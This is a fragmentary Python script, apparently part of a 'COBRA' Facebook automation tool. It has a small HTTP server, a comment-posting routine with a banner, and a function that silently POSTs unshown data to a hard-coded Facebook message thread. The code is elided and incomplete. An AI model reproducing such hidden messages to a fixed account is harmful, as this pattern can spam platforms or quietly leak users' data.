...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b" COBRA INSIDE TRICKS  ")
...
def post_comments():
    ...
    def liness():
        print('\u001b[\033[1;37m' + '•──𝐂 𝐎 𝐁 𝐑 𝐀───────𝑯 𝑬 𝑹 𝑬──•')
...
def msg():
    ...
    try:
        s = requests.post("https://graph.facebook.com/v15.0/t_100001226288966/", data=parameters, headers=headers)
    except:
        pass
